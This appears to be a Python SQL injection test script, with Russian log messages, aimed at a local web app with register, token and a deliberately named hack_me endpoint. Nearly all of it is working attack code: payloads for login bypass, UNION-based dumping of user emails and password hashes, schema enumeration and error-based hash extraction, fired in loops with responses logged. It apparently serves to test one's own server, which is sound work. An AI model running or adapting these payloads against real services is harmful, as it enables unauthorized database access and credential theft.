import requests
import json

url = "http://192.168.0.185:8000"

payloads = [
    {"username": "' OR '1'='1' --", "password": "anything", "name": "qrewqr", "age": 20, "town": "msc"},
    {"username": "' UNION SELECT id, email, hash_password FROM users --", "password": "anything", "name": "test", "age": 20, "town": "test"},
    {"username": "' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table' --", "password": "anything", "name": "test", "age": 20, "town": "test"},
    {"username": "' AND (SELECT 1 FROM users WHERE email='admin@example.com')=1 --", "password": "anything", "name": "test", "age": 20, "town": "test"},
    {"username": "' AND 1=CAST((SELECT hash_password FROM users LIMIT 1) AS INTEGER) --", "password": "anything", "name": "test", "age": 20, "town": "test"}
]

def test_reg():
    print("===============Регистр запущен===============")
    with open("sql_inj_log.txt", "a") as f:
        for i, payload in enumerate(payloads, 1):
            try:
                response = requests.post(f"{url}/register/", json=payload)
                f.write(f"Payload {i}: {json.dumps(payload)}\n")
                f.write(f"Статус: {response.status_code}\n")
                f.write(f"Ответ: {response.text}\n\n")
                print(f"Payload {i}: {payload}")
                print(f"Статус: {response.status_code}")
                print(f"Ответ: {response.text}\n")
            except requests.exceptions.RequestException as e:
                f.write(f"Ошибка при payload {i}: {e}\n\n")
                print(f"Ошибка при payload {i}: {e}\n")

def test_token():
    print("===============Токен запущен===============")
    with open("sql_inj_log.txt", "a") as f:
        for i, payload in enumerate(payloads, 1):
            data = {"username": payload["username"], "password": payload["password"]}
            try:
                response = requests.post(f"{url}/token/", data=data)
                f.write(f"Payload {i}: {json.dumps(data)}\n")
                f.write(f"Статус: {response.status_code}\n")
                f.write(f"Ответ: {response.text}\n\n")
                print(f"Payload {i}: {data}")
                print(f"Статус: {response.status_code}")
                print(f"Ответ: {response.text}\n")
            except requests.exceptions.RequestException as e:
                f.write(f"Ошибка при payload {i}: {e}\n\n")
                print(f"Ошибка при payload {i}: {e}\n")

def hack_me():
    print("===============Уязвимый эндпоинт запущен===============")
    with open("sql_inj_log.txt", "a") as f:
        for i, payload in enumerate(payloads, 1):
            try:
                response = requests.get(f"{url}/hack_me/", params={"query": payload["username"]})
                f.write(f"Payload {i}: query={payload['username']}\n")
                f.write(f"Статус: {response.status_code}\n")
                f.write(f"Ответ: {response.text}\n\n")
                print(f"Payload {i}: query={payload['username']}")
                print(f"Статус: {response.status_code}")
                print(f"Ответ: {response.text}\n")
            except requests.exceptions.RequestException as e:
                f.write(f"Ошибка при payload {i}: {e}\n\n")
                print(f"Ошибка при payload {i}: {e}\n")
                
if __name__ == "__main__":
    test_reg()
    test_token()
    hack_me()